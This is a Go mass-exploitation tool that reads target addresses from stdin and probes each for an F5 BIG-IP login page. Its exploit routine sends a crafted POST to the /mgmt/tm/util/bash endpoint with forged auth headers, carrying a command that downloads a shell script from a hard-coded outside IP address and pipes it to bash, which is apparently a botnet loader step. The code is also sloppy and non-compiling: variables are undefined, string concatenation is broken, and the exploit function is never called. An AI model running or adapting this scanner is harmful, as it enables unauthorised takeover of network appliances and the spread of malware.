
//Made by Benshii Varga
package main

import (
	"fmt"
    "net"
    "time"
    "bufio"
    "os"
    "sync"
    "strings"
    "math/rand"
	"strconv"
	"net/url"
)

var syncWait sync.WaitGroup
var statusExploited, statusAttempted, statusFound int
 // replace with your bins

func zeroByte(a []byte) {
    for i := range a {
        a[i] = 0
    }
}

func sendExploit(target string) {

	conn, err := net.DialTimeout("tcp", target, timeout * time.Second)
    if err != nil {
		return
    }

    conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
	conn.Write([]byte("POST /mgmt/tm/util/bash HTTP/1.1\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0%3B Win64%3B x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\r\nContent-Length: " + strconv.Itoa(len(payload) + 45)"\r\nCache-Control: max-age=0\r\nX-F5-Auth-Token: a\r\nContent-Type: application/json\r\nAuthorization: Basic YWRtaW46aG9yaXpvbjM=\r\nConnection: Keep-Alive, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host\r\n\r\n{'command': 'run', 'utilCmdArgs': '-c \"curl 209.141.41.137/a.sh|bash\"'}\r\n\r\n"))
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))

	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		conn.Close()
	    return
	}

	statusExploited++

	zeroByte(bytebuf)

	if isGpon == 0 {
		conn.Close()
		return
	}

	conn.Close()
	return
}

func checkDevice(target string, timeout time.Duration) int {

	var isGpon int = 0

	conn, err := net.DialTimeout("tcp", target, timeout * time.Second)
    if err != nil {
		return -1
    }

    conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
	conn.Write([]byte("GET /tmui/login.jsp HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0%3B Win64%3B x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\r\nSec-Ch-Ua: \"-Not.A/Brand\";v=\"8\", \"Chromium\";v=\"102\"\r\nSec-Ch-Ua-Mobile: ?0\r\nSec-Ch-Ua-Platform: \"macOS\"\r\nUpgrade-Insecure-Requests: 1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nSec-Fetch-Site: none\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\nConnection: close\r\n\r\n"))
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))

	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		conn.Close()
	    return -1
	}

	if strings.Contains(string(bytebuf), "HTTP/1.1 200 Ok") {
		statusFound++
		isGpon = 1
	}
	zeroByte(bytebuf)

	if isGpon == 0 {
		conn.Close()
		return -1
	}

	conn.Close()
	return 1
}

func processTarget(target string, rtarget string) {

	defer syncWait.Done()

	checkDevice(target, 10)
}

func main() {

	rand.Seed(time.Now().UTC().UnixNano())
	var i int = 0
    go func() {
		for {
			fmt.Printf("%d's | Total: %d, Found: %d, Exploited: %d\r\n", i, statusAttempted, statusFound, statusExploited)
			time.Sleep(1 * time.Second)
			i++
		}
	}()

    for {
        r := bufio.NewReader(os.Stdin)
        scan := bufio.NewScanner(r)
        for scan.Scan() {
            go processTarget(scan.Text() + ":" + os.Args[1], scan.Text())
			statusAttempted++
            syncWait.Add(1)
        }
    }
}
